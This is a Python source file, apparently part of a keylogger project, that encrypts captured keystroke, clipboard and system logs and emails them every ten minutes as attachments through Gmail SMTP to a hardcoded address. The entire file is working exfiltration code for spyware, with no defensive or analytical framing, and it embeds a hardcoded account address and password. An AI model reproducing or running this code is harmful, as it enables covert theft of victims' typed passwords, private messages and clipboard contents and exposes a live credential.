import smtplib
import os
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet

# Your email details
EMAIL_ADDRESS = "keyloggerproject10@gmail.com"  # Change this
EMAIL_PASSWORD = "Project@123"  # Change this
TO_EMAIL = "keyloggerproject10@gmail.com"  # Change this
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Define log file paths
LOG_FOLDER = "logs"
ENCRYPTED_LOGS = ["e_system.txt", "e_clipboard.txt", "e_keys_logged.txt"]

# Ensure logs folder exists
os.makedirs(LOG_FOLDER, exist_ok=True)

# Load encryption key
key_file = os.path.join(LOG_FOLDER, "encryption_key.key")

def load_key():
    return open(key_file, "rb").read()

key = load_key()
cipher = Fernet(key)

# Encrypt files before sending
def encrypt_file(file_path, encrypted_file_path):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = cipher.encrypt(data)

    with open(encrypted_file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)

def encrypt_logs():
    encrypt_file(os.path.join(LOG_FOLDER, "system.txt"), os.path.join(LOG_FOLDER, "e_system.txt"))
    encrypt_file(os.path.join(LOG_FOLDER, "clipboard.txt"), os.path.join(LOG_FOLDER, "e_clipboard.txt"))
    encrypt_file(os.path.join(LOG_FOLDER, "key_log.txt"), os.path.join(LOG_FOLDER, "e_keys_logged.txt"))

# Send logs via email
def send_email():
    msg = MIMEMultipart()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL
    msg["Subject"] = "Keylogger Logs"

    for file_name in ENCRYPTED_LOGS:
        file_path = os.path.join(LOG_FOLDER, file_name)
        with open(file_path, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={file_name}")
            msg.attach(part)

    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
        server.quit()
        print("[+] Email sent successfully")
    except Exception as e:
        print(f"[-] Failed to send email: {e}")

# Run the process every 10 minutes
while True:
    encrypt_logs()  # Encrypt logs before sending
    send_email()  # Send encrypted logs
    time.sleep(600)  # Wait 10 minutes (600 seconds)